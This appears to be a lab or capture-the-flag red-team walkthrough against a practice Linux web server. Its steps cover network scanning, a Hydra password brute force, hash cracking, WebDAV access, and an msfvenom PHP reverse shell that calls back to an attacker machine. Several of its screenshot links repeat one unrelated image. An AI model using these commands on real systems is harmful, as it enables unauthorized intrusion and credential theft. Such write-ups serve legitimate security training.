##Red Team 

###Step 1: Discovering the IP address of the linux server.

In order to find the ip address of the machine, we will need to use a network mapping tool called Nmap to scan the network. 

- Open the terminal and run: nmap 192.168.1.0/24 (We used this ip cidr range bcause our attack machine belongs to this subnetwork.)

![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/1_nmap.jpg)

From the Nmap scan we can see that port 80 is open. Next we opened a web browser and typed the IP address of the machine into the address bar.

-Open web browser and navigate to 192.168.1.105 and press enter. 
![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/2_web_discovery.jpg)



###Step 2: Locating the hidden directory on the server.

- We navigated through different directories, we noticed reocurring messages:

![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/recurring%20message.JPG)

- Upon such discovery we navigated to the directory by typing: 192.168.1.105/company_folders/secret_folder

- The directory asked us for authentication in order to access it. Reading the authentication method, it says "For ashton's eyes only"

![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/ashton_eyes_only.jpg)

- We then went back to the web browser and use the credential to log in. We clicked the file connecting_to_webdav

![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/webdav_connection.jpg)


### Step 3: Brute force the password for the hidden directory.

Because the folder is password protected, we need to either guess the password or brute force into the directory. In this case, it would be much more efficient
to use a brute force attack, specifically Hydra. 

- Using Ashton's name, run the Hydra attack against the directory: 

   - type: hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder

![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/hydra_sytanx.jpg)

- The brute force attack may take some time. Once it finished, the username is ashton and the password is leopoldo.

![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/password_discovery.jpg)

-We went back to the web browser and used the credentiial to log in. We open the file connecting_to_webdav file.  

![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/14_webdav_%20access_laststeps.png)

- Located inside of the WebDAV file are instructions on how to connect to the WebDAV directory, as well the user's username and hashed password.

![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/8a_webdav_hash.jpg)


### Step 4: Connect to the server via Webdav 

There are several ways to break the password hash. But in this intanse we avoided waiting for john to crack the password hash, we used https://crackstation.net
paste the password hash and filled out the CAPTCHA; and clicked Crack Hashes. 

![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/9_password_hash_cracking.jpg)

- The password is revealed as: linux4u

### Step 5: Connecting to the server via WebDAV.

- We gained important information to make the WebDAV connection on our local attack machine. We used that information by:
	
	- We opened the file system shortcut from the desktop.
	
	- Clicked on Browse Network.

	- In the URL bar, typed: dav://192.168.1.105/webdav, and entered the credentials to log in.

![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Ansible/docker_ps_screenshot.png)


### Step 6: Creating and Uploading a PHP reverse shell payload.

- To set up the reverse shell, run:
	- msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php

- The series of command above does the following :

	- msfconsole to launch msfconsole.

	- use exploit/multi/handler
	
	- set payload php/meterpreter/reverse_tcp

	- show options and point out they need to set the LHOST

	- set LHOST 192.168.1.90(Attacker Machine)

	- exploit  

- Placed the reverse shell onto the webDAV directory

- We logged back in, visited the webdav folder by navigating to 192.168.1.105/webdav. Used the credentials obtained before, user:ryan pass:linux4u

- I visited where i uploaded the reverse shell and clicked it to activate it. (If it seems like tge browser is hanging or loading, that means it has worked.)

![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Ansible/docker_ps_screenshot.png)

### Step 7: Find and capture the flag. 

- on the listener, we are going to search for the file flag.txt located in the root directory. To do such i did the following:

	- Dropped a bash shell with the command: shell

	- Changed directory to the / directory: cd /

	- Searched the system for any files containing the phrase "flag" : find . -iname flag.txt

- Printed the file once i located it by: cat flag.txt

![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Ansible/docker_ps_screenshot.png)

![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Ansible/docker_ps_screenshot.png)


